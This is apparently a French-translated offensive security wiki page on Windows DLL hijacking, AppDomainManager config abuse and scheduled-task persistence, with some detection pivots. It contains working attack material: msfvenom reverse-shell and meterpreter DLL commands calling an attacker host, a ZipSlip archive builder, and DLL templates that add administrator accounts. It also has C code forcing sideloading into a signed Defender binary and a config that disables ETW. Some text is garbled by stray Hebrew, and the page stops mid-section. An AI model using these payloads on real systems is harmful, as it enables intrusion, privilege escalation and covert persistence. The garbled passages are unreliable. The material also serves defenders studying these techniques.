# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking implique de manipuler une application de confiance pour qu’elle charge une DLL malveillante. Ce terme englobe plusieurs tactiques comme **DLL Spoofing, Injection, et Side-Loading**. C’est בעיקרement utilisé pour l’exécution de code, obtenir une persistance, et, plus rarement, une élévation de privilèges. Malgré l’accent mis ici sur l’escalade, la méthode de hijacking reste la même quel que soit l’objectif.

### Common Techniques

Plusieurs méthodes sont utilisées pour le DLL hijacking, chacune avec son efficacité selon la stratégie de chargement des DLL de l’application :

1. **DLL Replacement** : Remplacer une DLL légitime par une malveillante, éventuellement en utilisant DLL Proxying pour conserver la fonctionnalité de la DLL d’origine.
2. **DLL Search Order Hijacking** : Placer la DLL malveillante dans un chemin de recherche avant la DLL légitime, en exploitant le schéma de recherche de l’application.
3. **Phantom DLL Hijacking** : Créer une DLL malveillante qu’une application va charger, en pensant qu’il s’agit d’une DLL requise inexistante.
4. **DLL Redirection** : Modifier des paramètres de recherche comme `%PATH%` ou des fichiers `.exe.manifest` / `.exe.local` pour diriger l’application vers la DLL malveillante.
5. **WinSxS DLL Replacement** : Remplacer la DLL légitime par une version malveillante dans le répertoire WinSxS, une méthode souvent associée au DLL side-loading.
6. **Relative Path DLL Hijacking** : Placer la DLL malveillante dans un répertoire contrôlé par l’utilisateur avec l’application copiée, ce qui ressemble aux techniques de Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Le DLL sideloading classique n’est pas la seule façon de faire charger du code attaquant à un processus **.NET Framework** de confiance. Si l’exécutable cible est une application **managed**, le CLR consulte aussi un **fichier de configuration d’application** nommé d’après l’exécutable (par exemple `Setup.exe.config`). Ce fichier peut définir un **AppDomainManager** personnalisé. Si la config pointe vers un assembly contrôlé par l’attaquant et placé à côté du EXE, le CLR le charge **avant le chemin normal du code de l’application** et l’exécute à l’intérieur du processus de confiance.

Selon le schéma de configuration .NET Framework de Microsoft, `<appDomainManagerAssembly>` et `<appDomainManagerType>` doivent tous deux être présents pour que le gestionnaire personnalisé soit utilisé.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Gestionnaire minimal :
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Notes pratiques :
- Ceci est un tradecraft spécifique à **.NET Framework**. Il dépend de l’analyse de la config CLR, pas de l’ordre de recherche des DLL Win32.
- L’hôte doit vraiment être un **managed EXE**. Tri rapide : `sigcheck -m target.exe`, `corflags target.exe`, ou vérifier le **CLR Runtime Header** dans les métadonnées PE.
- Le nom du fichier de config doit correspondre exactement au nom de l’exécutable (`<binary>.config`) et se trouve généralement **à côté du EXE**.
- C’est utile avec des **signed Microsoft/vendor binaries** car l’EXE de confiance reste intact tandis que l’assembly managé malveillant s’exécute dans le processus.
- Si tu as déjà un répertoire d’installateur/mise à jour inscriptible, AppDomainManager hijacking peut servir de **première étape**, suivi de classic DLL sideloading ou de reflective loading pour les étapes suivantes.

### AppDomainManager comme downloader + bootstrap de scheduled-task

Un pattern d’intrusion pratique consiste à associer l’EXE managé de confiance avec à la fois un `*.config` malveillant et une DLL AppDomainManager malveillante qui agit seulement comme un **petit bootstrapper** :

1. L’utilisateur lance un installateur ou updater .NET signé depuis un emplacement crédible comme `%USERPROFILE%\Downloads`.
2. La config adjacente force le CLR à charger l’assembly de l’attaquant **avant** que la logique légitime de l’application ne démarre.
3. Le manager malveillant effectue une **path gate** (par exemple, ne continuer que si l’EXE hôte s’exécute depuis `Downloads`, et ne laisser le second stage s’exécuter que depuis `%LOCALAPPDATA%`).
4. Si la vérification passe, il télécharge le payload réel dans un chemin inscriptible par l’utilisateur comme `%LOCALAPPDATA%\PerfWatson2.exe` et installe la persistance avec une scheduled task.

Pourquoi cette variante compte :
- L’EXE hôte signé reste inchangé, donc une triage qui ne hash que le binaire principal peut manquer la compromission.
- Le simple **path-based anti-analysis** est courant : déplacer le trio ZIP/EXE/DLL vers le Desktop, Temp ou un chemin sandbox peut casser volontairement la chaîne.
- La DLL AppDomainManager de première étape peut rester petite et discrète pendant que le véritable implant est récupéré plus tard.

Exemple minimal de persistance fréquemment observé avec ce pattern :
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notes :
- ` /rl highest` signifie **highest available** pour cet utilisateur/session ; ce n’est pas à lui seul une élévation vers SYSTEM garantie.
- Cette technique est souvent mieux classée comme **execution/persistence via .NET config abuse** que comme un classic missing-DLL search-order hijacking, même si les operators combinent souvent les deux.

Detection pivots :
- Des exécutables .NET signés lancés depuis des chemins d’extraction de **ZIP**, `Downloads`, `%TEMP%`, ou d’autres dossiers inscriptibles par l’utilisateur, avec un `<exe>.config` **colocated**.
- De nouvelles scheduled tasks dont l’action pointe vers `%LOCALAPPDATA%`, `%APPDATA%` ou `Downloads`, et dont les noms imitent des updaters de browser/vendor.
- Des managed bootstrap processes de courte durée qui téléchargent immédiatement un autre EXE, puis lancent `schtasks.exe`.
- Des samples qui quittent tôt sauf si le chemin de l’exécutable correspond à un répertoire attendu du profil utilisateur.

### Hijacking an existing scheduled task to relaunch the sideload chain

Pour la persistence, ne cherchez pas seulement à **créer une nouvelle task**. Certains intrusion sets attendent qu’un installateur légitime crée une **normal updater task**, puis **réécrivent l’action de la task** afin que le nom, l’auteur et le trigger existants restent familiers aux defenders.

Reusable workflow:
1. Installez/exécutez le logiciel légitime et identifiez la task qu’il crée normalement.
2. Exportez le XML de la task et notez les valeurs actuelles de `<Exec><Command>` / `<Arguments>`.
3. Remplacez uniquement l’action afin que la task lance votre **trusted host EXE** depuis un répertoire de staging inscriptible par l’utilisateur, lequel side-loads ensuite ou AppDomain-loads le vrai payload.
4. Ré-enregistrez le même nom de task au lieu de créer un nouvel artifact de persistence évident.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Pourquoi c’est plus furtif :
- Le nom de la tâche peut toujours paraître légitime (par exemple, un updater d’éditeur).
- Le **Task Scheduler service** la lance, donc la validation parent/ancestor voit souvent la chaîne de planification attendue au lieu de `explorer.exe`.
- Les équipes DFIR qui ne recherchent que les **nouveaux noms de tâches** peuvent manquer une tâche dont l’enregistrement existait déjà, mais dont l’action pointe maintenant vers `%LOCALAPPDATA%`, `%APPDATA%`, ou un autre chemin contrôlé par l’attaquant.

Pivots de hunting rapides :
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Comparez les métadonnées XML de `C:\Windows\System32\Tasks\*` et de `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` avec une baseline.
- Déclenchez une alerte lorsqu’une **tâche d’updater qui ressemble à celle d’un éditeur** s’exécute depuis des **répertoires inscriptibles par l’utilisateur** ou lance un EXE .NET avec un fichier `*.config` co-localisé.

> [!TIP]
> Pour une chaîne pas à pas qui superpose du HTML staging, des configs AES-CTR et des implants .NET par-dessus du DLL sideloading, consultez le workflow ci-dessous.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

La manière la plus courante de trouver des Dlls manquantes dans un système est d’exécuter [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de Sysinternals, **en configurant** les **2 filtres suivants** :

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

et en affichant uniquement l’**activité du File System** :

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Si vous cherchez des **missing dlls en général**, laissez cela tourner pendant quelques **secondes**.\
Si vous cherchez une **missing dll dans un exécutable spécifique**, vous devez définir **un autre filtre comme "Process Name" "contains" `<exec name>`, l’exécuter, puis arrêter la capture des événements**.

## Exploiting Missing Dlls

Afin d’élever les privilèges, notre meilleure chance est de pouvoir **écrire une dll qu’un processus privilégié essaiera de charger** à un endroit où elle va être recherchée. Ainsi, nous pourrons **écrire** une dll dans un **dossier** où la **dll est recherchée avant** le dossier où se trouve la **dll originale** (cas étrange), ou bien nous pourrons **écrire dans un dossier où la dll va être recherchée** et où la **dll originale** n’existe dans aucun dossier.

### Dll Search Order

**Dans la** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **vous pouvez voir comment les Dlls sont chargées précisément.**

Les **applications Windows** recherchent les DLL en suivant un ensemble de **chemins de recherche prédéfinis**, selon une séquence particulière. Le problème du DLL hijacking survient lorsqu’une DLL malveillante est placée stratégiquement dans l’un de ces répertoires, ce qui garantit qu’elle sera chargée avant la DLL authentique. Une solution pour éviter cela consiste à faire en sorte que l’application utilise des chemins absolus lorsqu’elle fait référence aux DLL dont elle a besoin.

Vous pouvez voir l’**ordre de recherche des DLL sur les systèmes 32-bit** ci-dessous :

1. Le répertoire depuis lequel l’application a été chargée.
2. Le répertoire système. Utilisez la fonction [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) pour obtenir le chemin de ce répertoire.(_C:\Windows\System32_)
3. Le répertoire système 16-bit. Il n’existe pas de fonction permettant d’obtenir le chemin de ce répertoire, mais il est recherché. (_C:\Windows\System_)
4. Le répertoire Windows. Utilisez la fonction [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) pour obtenir le chemin de ce répertoire.
1. (_C:\Windows_)
5. Le répertoire courant.
6. Les répertoires listés dans la variable d’environnement PATH. Notez que cela n’inclut pas le chemin par application spécifié par la clé de registre **App Paths**. La clé **App Paths** n’est pas utilisée lors du calcul du chemin de recherche des DLL.

C’est l’ordre de recherche **par défaut** avec **SafeDllSearchMode** activé. Lorsqu’il est désactivé, le répertoire courant passe en deuxième position. Pour désactiver cette fonctionnalité, créez la valeur de registre **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** et définissez-la à 0 (la valeur par défaut est activée).

Si la fonction [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) est appelée avec **LOAD_WITH_ALTERED_SEARCH_PATH**, la recherche commence dans le répertoire du module exécutable que **LoadLibraryEx** est en train de charger.

Enfin, notez qu’une **dll peut être chargée en indiquant le chemin absolu au lieu du simple nom**. Dans ce cas, cette dll sera **recherchée uniquement dans ce chemin** (si la dll a des dépendances, elles seront recherchées comme si elles venaient d’être chargées par nom).

Il existe d’autres façons de modifier l’ordre de recherche, mais je ne vais pas les expliquer ici.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Utilisez les filtres **ProcMon** (`Process Name` = EXE cible, `Path` se termine par `.dll`, `Result` = `NAME NOT FOUND`) pour collecter les noms de DLL que le processus tente d’ouvrir mais ne trouve pas.
2. Si le binaire s’exécute via une **schedule/service**, déposer une DLL portant l’un de ces noms dans le **répertoire de l’application** (entrée #1 de l’ordre de recherche) fera qu’elle sera chargée à l’exécution suivante. Dans un cas de scanner .NET, le processus cherchait `hostfxr.dll` dans `C:\samples\app\` avant de charger la vraie copie depuis `C:\Program Files\dotnet\fxr\...`.
3. Construisez une DLL payload (par exemple, reverse shell) avec n’importe quel export : `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Si votre primitive est une **ZipSlip-style arbitrary write**, construisez un ZIP dont l’entrée sort du répertoire d’extraction afin que la DLL arrive dans le dossier de l’application :
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Livrer l’archive à la boîte de réception/share surveillée ; lorsque la tâche planifiée relance le processus, il charge le DLL malveillant et exécute votre code en tant que compte de service.

### Forcer le sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Une manière avancée de piloter de façon déterministe le chemin de recherche des DLL d’un nouveau processus est de définir le champ DllPath dans RTL_USER_PROCESS_PARAMETERS lors de la création du processus avec les API natives de ntdll. En fournissant ici un répertoire contrôlé par l’attaquant, un processus cible qui résout une DLL importée par son nom (sans chemin absolu et sans utiliser les safe loading flags) peut être forcé à charger un DLL malveillant depuis ce répertoire.

Idée clé
- Construire les paramètres du processus avec RtlCreateProcessParametersEx et fournir un DllPath personnalisé qui pointe vers votre dossier contrôlé (par ex. le répertoire où se trouve votre dropper/unpacker).
- Créer le processus avec RtlCreateUserProcess. Quand le binaire cible résout une DLL par son nom, le loader consultera ce DllPath fourni pendant la résolution, ce qui permet un sideloading fiable même lorsque le DLL malveillant n’est pas colocated avec l’EXE cible.

Notes/limitations
- Cela affecte le processus enfant en cours de création ; c’est différent de SetDllDirectory, qui n’affecte que le processus courant.
- La cible doit importer ou LoadLibrary un DLL par son nom (sans chemin absolu et sans utiliser LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- Les KnownDLLs et les chemins absolus codés en dur ne peuvent pas être hijacked. Les exports forwarded et SxS peuvent modifier la precedence.

Exemple C minimal (ntdll, chaînes larges, gestion d’erreurs simplifiée) :

<details>
<summary>Exemple C complet : forcer le sideloading de DLL via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Exemple d’utilisation opérationnelle
- Placez un xmllite.dll malveillant (exportant les fonctions requises ou faisant du proxy vers le vrai) dans votre répertoire DllPath.
- Lancez un binaire signé connu pour rechercher xmllite.dll par nom en utilisant la technique ci-dessus. Le loader résout l’import via le DllPath fourni et charge latéralement votre DLL.

Cette technique a été observée dans la nature pour alimenter des chaînes de sideloading multi-étapes : un lanceur initial dépose une DLL helper, qui lance ensuite un binaire signé par Microsoft, hijackable, avec un DllPath personnalisé pour forcer le chargement de la DLL de l’attaquant depuis un répertoire de staging.


### Hijacking du .NET AppDomainManager via `.exe.config`

Pour les cibles **.NET Framework**, le sideloading peut se faire **avant `Main()`** sans patcher la mémoire en abusant du fichier adjacent **`.exe.config`** de l’application. Au lieu de s’appuyer uniquement sur l’ordre de recherche Win32 des DLL, l’attaquant place un EXE .NET légitime à côté d’une config malveillante et d’une ou plusieurs assemblies contrôlées par l’attaquant.

Fonctionnement de la chaîne :
1. Le EXE hôte démarre et le **CLR lit `<exe>.config`**.
2. La config définit **`<appDomainManagerAssembly>`** et **`<appDomainManagerType>`** afin que le runtime instancie un `AppDomainManager` contrôlé par l’attaquant.
3. Le manager malveillant obtient une exécution **pré-`Main()`** dans le processus hôte de confiance.
4. La même config peut forcer le CLR à résoudre d’abord les assemblies locaux (par exemple `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) et peut réduire la validation/télémétrie du runtime sans patching inline.

Modèle de campagne (l’imbrication exacte peut varier selon la directive / la version du CLR) :
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Why this is useful:
- **`<probing privatePath="."/>`** garde la résolution des assemblys dans le répertoire de l’application, transformant le dossier en surface de sideloading prévisible.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** déplacent l’exécution vers le code de l’attaquant pendant l’initialisation du CLR, avant que la logique légitime de l’application ne s’exécute.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** peut permettre à une app full-trust de charger des assemblys non signés ou modifiés sans échec de validation strong-name.
- **`<publisherPolicy apply="no"/>`** évite les redirections de publisher-policy vers des assemblys plus récents.
- **`<requiredRuntime ... safemode="true"/>`** rend la sélection du runtime plus déterministe.
- **`<etwEnable enabled="false"/>`** est particulièrement intéressant parce que le **CLR désactive sa propre visibilité ETW** depuis la configuration, au lieu que l’implant patch **`EtwEventWrite`** en mémoire.

Operational pattern seen in recent campaigns:
- Stage 1 dépose `setup.exe`, `setup.exe.config`, et des assemblys locales.
- Stage 2 les copie dans un dossier **AppData update** crédible, renomme l’hôte en quelque chose comme `update.exe`, et le relance via une **scheduled task**.
- Stage 3 vérifie le contexte d’exécution (par exemple le parent attendu `svchost.exe` depuis Task Scheduler) avant de charger le DLL/export RAT final.

Hunting ideas:
- **.NET executables** signés ou autrement légitimes s’exécutant avec des fichiers **`.config`** adjacents suspects dans des emplacements modifiables par l’utilisateur.
- Fichiers `.config` contenant **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, ou **`etwEnable enabled="false"`**.
- Des scheduled tasks qui relancent des binaires de mise à jour renommés depuis **`%LOCALAPPDATA%`** ou des répertoires spécifiques à l’application `\bin\update\`.
- Des chaînes parent/enfant où une scheduled task lance un hôte .NET de confiance qui charge immédiatement des assemblys non-vendor depuis son propre répertoire.

#### Exceptions on dll search order from Windows docs

Certaines exceptions à l’ordre standard de recherche des DLL sont notées dans la documentation Windows :

- Lorsqu’une **DLL qui partage son nom avec une autre déjà chargée en mémoire** est rencontrée, le système contourne la recherche habituelle. À la place, il effectue une vérification de redirection et de manifest avant de se rabattre sur la DLL déjà en mémoire. **Dans ce scénario, le système n’effectue pas de recherche pour la DLL**.
- Dans les cas où la DLL est reconnue comme une **known DLL** pour la version actuelle de Windows, le système utilisera sa version de la known DLL, ainsi que celles de ses DLL dépendantes, **en renonçant au processus de recherche**. La clé de registre **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contient une liste de ces known DLLs.
- Si une **DLL a des dépendances**, la recherche de ces DLL dépendantes est effectuée comme si elles étaient indiquées uniquement par leurs **noms de module**, indépendamment du fait que la DLL initiale ait été identifiée via un chemin complet.

### Escalating Privileges

**Requirements**:

- Identifier un processus qui s’exécute ou s’exécutera sous **des privilèges différents** (mouvement horizontal ou latéral), et qui **manque d’une DLL**.
- S’assurer qu’un **accès en écriture** est disponible pour tout **répertoire** dans lequel la **DLL** sera **recherchée**. Cet emplacement peut être le répertoire de l’exécutable ou un répertoire dans le system path.

Oui, les prérequis sont compliqués à trouver, car **par défaut c’est assez étrange de trouver un exécutable privilégié auquel il manque une dll** et c’est encore **plus étrange d’avoir des permissions en écriture sur un dossier du system path** (ce n’est pas le cas par défaut). Mais, dans des environnements mal configurés, c’est possible.\
Si vous avez de la chance et que vous remplissez les conditions, vous pouvez consulter le projet [UACME](https://github.com/hfiref0x/UACME). Même si **l’objectif principal du projet est de bypass UAC**, vous y trouverez peut-être un **PoC** de Dll hijaking pour la version de Windows que vous pouvez utiliser (probablement en changeant simplement le chemin du dossier où vous avez des permissions en écriture).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Et **vérifiez les permissions de tous les dossiers à l'intérieur de PATH** :
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vous pouvez également vérifier les imports d’un executable et les exports d’un dll avec :
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

In case you find an exploitable scenario one of the most important things to successfully exploit it would be to **create a dll that exports at least all the functions the executable will import from it**. Anyway, note that Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **next section** you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basically a **Dll proxy** is a Dll capable of **execute your malicious code when loaded** but also to **expose** and **work** as **exected** by **relaying all the calls to the real library**.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenir un meterpreter (x86) :**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Créer un utilisateur (x86 je n'ai pas vu de version x64) :**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Votre propre

Notez que dans plusieurs cas, le Dll que vous compilez doit **exporter plusieurs fonctions** qui vont être chargées par le processus victime, si ces fonctions n'existent pas le **binaire ne pourra pas les charger** et l'**exploit échouera**.

<details>
<summary>Modèle C DLL (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Exemple de DLL C++ avec création d'utilisateur</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternative avec entrée de thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Étude de cas : Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe continue d’interroger, au démarrage, une DLL de localisation prévisible et spécifique à la langue, qui peut être hijacked pour exécution de code arbitraire et persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Si une DLL inscriptible contrôlée par l’attaquant existe au chemin OneCore, elle est chargée et `DllMain(DLL_PROCESS_ATTACH)` s’exécute. Aucun export n’est requis.

Discovery avec Procmon
- Filter: `Process Name is Narrator.exe` et `Operation is Load Image` ou `CreateFile`.
- Démarrez Narrator et observez la tentative de chargement du chemin ci-dessus.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
Silence OPSEC
- Un hijack naïf parlera/mettra en surbrillance l’UI. Pour rester discret, à l’attach énumérez les threads de Narrator, ouvrez le thread principal (`OpenThread(THREAD_SUSPEND_RESUME)`) et `SuspendThread`-le ; continuez dans votre propre thread. Voir le PoC pour le code complet.

Trigger and persistence via Accessibility configuration
- Contexte utilisateur (HKCU) : `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM) : `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Avec ce qui précède, lancer Narrator charge la DLL plantée. Sur le secure desktop (écran de connexion), appuyez sur CTRL+WIN+ENTER pour démarrer Narrator ; votre DLL s’exécute en tant que SYSTEM sur le secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Autorisez la couche de sécurité RDP classique : `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
